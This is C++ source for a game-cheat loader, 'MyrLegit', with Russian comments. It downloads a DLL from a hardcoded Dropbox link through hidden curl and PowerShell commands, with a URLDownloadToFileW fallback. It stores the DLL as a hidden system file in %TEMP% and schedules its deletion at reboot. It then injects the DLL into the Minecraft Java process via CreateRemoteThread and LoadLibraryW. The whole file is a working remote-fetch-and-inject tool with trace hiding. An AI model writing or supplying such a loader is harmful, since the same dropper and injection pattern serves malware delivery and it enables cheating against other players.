/*
 *  MyrLegit Cloud Loader / Injector
 *  ─────────────────────────────────────────────
 *  - Автоматическая загрузка MyrLegit.dll напрямую из Dropbox
 *  - Файл не сохраняется в папке с инжектором (сохраняется во временный скрытый файл в %TEMP%
 *    и планируется к авто-удалению)
 *  - Авто-ожидание и поиск процесса Minecraft (1.12.2)
 *  - Внедрение DLL в Minecraft без лишних окон и вопросов
 *  - Завершение: " Успешно. Приятной игры"
 */
#include <Windows.h>
#include <urlmon.h>
#include <wininet.h>
#include <shellapi.h>
#include <TlHelp32.h>
#include <objbase.h>
#include <string>
#include <vector>
#include <iostream>
#include <filesystem>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

namespace fs = std::filesystem;

static const wchar_t* DROPBOX_URL = 
    L"https://www.dropbox.com/scl/fi/uzoe0vgkaejci71gms29t/MyrLegit.dll?rlkey=fm7j2x10gqj5wtngozvzytyuv&st=rjr8yje4&dl=1";

static void Print(const std::wstring& text) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written = 0;
    if (hOut != INVALID_HANDLE_VALUE && hOut != nullptr) {
        if (!WriteConsoleW(hOut, text.c_str(), static_cast<DWORD>(text.length()), &written, nullptr)) {
            int utf8Len = WideCharToMultiByte(CP_UTF8, 0, text.c_str(), static_cast<int>(text.length()), nullptr, 0, nullptr, nullptr);
            if (utf8Len > 0) {
                std::vector<char> buf(utf8Len);
                WideCharToMultiByte(CP_UTF8, 0, text.c_str(), static_cast<int>(text.length()), buf.data(), utf8Len, nullptr, nullptr);
                WriteFile(hOut, buf.data(), static_cast<DWORD>(utf8Len), &written, nullptr);
            }
        }
    } else {
        std::wcout << text;
        std::wcout.flush();
    }
}

static void EnableDebugPrivilege() {
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hToken);
    }
}

struct JavaProc {
    DWORD pid = 0;
    std::wstring name;
    std::wstring exePath;
    bool isMinecraft = false;
    bool hasWindow = false;
    std::wstring windowTitle;
};

struct WindowSearchCtx {
    DWORD pid;
    HWND hwnd;
    wchar_t title[256];
};

static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    auto* ctx = reinterpret_cast<WindowSearchCtx*>(lParam);
    DWORD wndPid = 0;
    GetWindowThreadProcessId(hwnd, &wndPid);
    if (wndPid == ctx->pid && IsWindowVisible(hwnd)) {
        int len = GetWindowTextW(hwnd, ctx->title, 256);
        if (len > 0) {
            ctx->hwnd = hwnd;
            return FALSE;
        }
    }
    return TRUE;
}

static std::vector<JavaProc> FindAllJava() {
    std::vector<JavaProc> result;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return result;

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name = pe.szExeFile;
            if (_wcsicmp(name.c_str(), L"javaw.exe") == 0 ||
                _wcsicmp(name.c_str(), L"java.exe")  == 0) {

                WindowSearchCtx ctx{ pe.th32ProcessID, nullptr, {0} };
                EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&ctx));

                JavaProc p;
                p.pid = pe.th32ProcessID;
                p.name = name;
                p.hasWindow = (ctx.hwnd != nullptr);
                p.windowTitle = ctx.title;

                HANDLE hModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pe.th32ProcessID);
                if (hModSnap != INVALID_HANDLE_VALUE) {
                    MODULEENTRY32W me{ sizeof(me) };
                    if (Module32FirstW(hModSnap, &me)) {
                        p.exePath = me.szExePath;
                        do {
                            std::wstring mName = me.szModule;
                            for (auto& c : mName) c = towlower(c);
                            if (mName == L"lwjgl64.dll" || mName == L"lwjgl.dll") {
                                p.isMinecraft = true;
                            }
                        } while (Module32NextW(hModSnap, &me));
                    }
                    CloseHandle(hModSnap);
                }

                std::wstring lowPath = p.exePath;
                for (auto& c : lowPath) c = towlower(c);
                if (lowPath.find(L"mimic_spoofer") != std::wstring::npos) {
                    p.isMinecraft = false;
                }

                result.push_back(p);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return result;
}

static bool Inject(DWORD pid, const std::wstring& dllPath) {
    DWORD access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE proc = OpenProcess(access, FALSE, pid);
    if (!proc) {
        proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    if (!proc) return false;

    size_t sz = (dllPath.size() + 1) * sizeof(wchar_t);
    void* remoteMem = VirtualAllocEx(proc, nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(proc);
        return false;
    }

    if (!WriteProcessMemory(proc, remoteMem, dllPath.c_str(), sz, nullptr)) {
        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(proc);
        return false;
    }

    auto loadLib = reinterpret_cast<LPTHREAD_START_ROUTINE>(
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"));

    HANDLE thread = CreateRemoteThread(proc, nullptr, 0, loadLib, remoteMem, 0, nullptr);
    if (!thread) {
        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(proc);
        return false;
    }

    WaitForSingleObject(thread, 8000);

    DWORD exitCode = 0;
    GetExitCodeThread(thread, &exitCode);

    VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
    CloseHandle(thread);
    CloseHandle(proc);

    return exitCode != 0;
}

// Очистка старых временных файлов от предыдущих запусков
static void CleanupOldTempFiles() {
    wchar_t tempDir[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempDir) > 0) {
        std::error_code ec;
        for (const auto& entry : fs::directory_iterator(tempDir, ec)) {
            if (ec) break;
            std::wstring fname = entry.path().filename().wstring();
            if (fname.rfind(L"myr_", 0) == 0 && entry.path().extension() == L".dll") {
                DeleteFileW(entry.path().c_str());
            }
        }
    }
}

// ── Надежная загрузка файла из Dropbox напрямую ──────────────────────────────
static bool DownloadFromDropbox(const std::wstring& destPath) {
    // 1. Попытка через curl.exe (встроен во все Windows 10 и 11)
    std::wstring curlCmd = L"curl.exe -s -L \"" + std::wstring(DROPBOX_URL) + L"\" -o \"" + destPath + L"\"";
    
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};

    std::vector<wchar_t> cmdBuf(curlCmd.begin(), curlCmd.end());
    cmdBuf.push_back(L'\0');

    if (CreateProcessW(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (fs::exists(destPath) && fs::file_size(destPath) > 500000) {
            return true;
        }
    }

    // 2. Fallback через PowerShell WebClient
    std::wstring psCmd = L"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadFile('" + std::wstring(DROPBOX_URL) + L"', '" + destPath + L"')\"";
    std::vector<wchar_t> psBuf(psCmd.begin(), psCmd.end());
    psBuf.push_back(L'\0');

    if (CreateProcessW(nullptr, psBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (fs::exists(destPath) && fs::file_size(destPath) > 500000) {
            return true;
        }
    }

    // 3. Fallback через URLDownloadToFileW
    DeleteUrlCacheEntryW(DROPBOX_URL);
    HRESULT hr = URLDownloadToFileW(nullptr, DROPBOX_URL, destPath.c_str(), 0, nullptr);
    if (SUCCEEDED(hr) && fs::exists(destPath) && fs::file_size(destPath) > 500000) {
        return true;
    }

    return false;
}

int wmain(int argc, wchar_t* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    SetConsoleTitleW(L"MyrLegit");

    CoInitialize(nullptr);
    EnableDebugPrivilege();

    // 1. Очистка старых временных файлов от прошлых сессий
    CleanupOldTempFiles();

    // 2. Скачивание чита напрямую из Dropbox во временную скрытую область %TEMP%
    wchar_t tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);

    std::wstring tempDllPath = std::wstring(tempDir) + L"myr_" + std::to_wstring(GetTickCount64()) + L".dll";

    Print(L"Загружаю dll-файл\n");

    bool downloaded = DownloadFromDropbox(tempDllPath);
    if (!downloaded || !fs::exists(tempDllPath) || fs::file_size(tempDllPath) < 500000) {
        Print(L"[Ошибка] Не удалось загрузить чит!\n");
        Print(L"Проверьте интернет-соединение.\n");
        Sleep(3500);
        return 1;
    }

    // Делаем временный файл скрытым и системным (в папке инжектора ничего нет!)
    SetFileAttributesW(tempDllPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
    // Планируем авто-удаление системой при перезагрузке
    MoveFileExW(tempDllPath.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);

    // 3. Поиск и ожидание Minecraft
    DWORD targetPid = 0;
    bool waitingShown = false;
    while (targetPid == 0) {
        auto procs = FindAllJava();
        for (const auto& p : procs) {
            if (p.isMinecraft) {
                targetPid = p.pid;
                break;
            }
        }
        if (targetPid == 0 && !procs.empty()) {
            for (const auto& p : procs) {
                if (p.hasWindow) {
                    targetPid = p.pid;
                    break;
                }
            }
        }

        if (targetPid == 0) {
            if (!waitingShown) {
                Print(L"Ожидание запуска Minecraft...\n");
                waitingShown = true;
            }
            Sleep(1000);
        }
    }

    Print(L"Ещё чуть чуть...\n");
    Sleep(800);

    bool ok = Inject(targetPid, tempDllPath);

    if (ok) {
        Print(L"Готово!\n");
        Print(L"Приятной игры!\n");
        Sleep(2000);
        return 0;
    } else {
        Print(L"\n[!] Не получилось, попробуй позже.\n");
        Sleep(3000);
        return 1;
    }
}
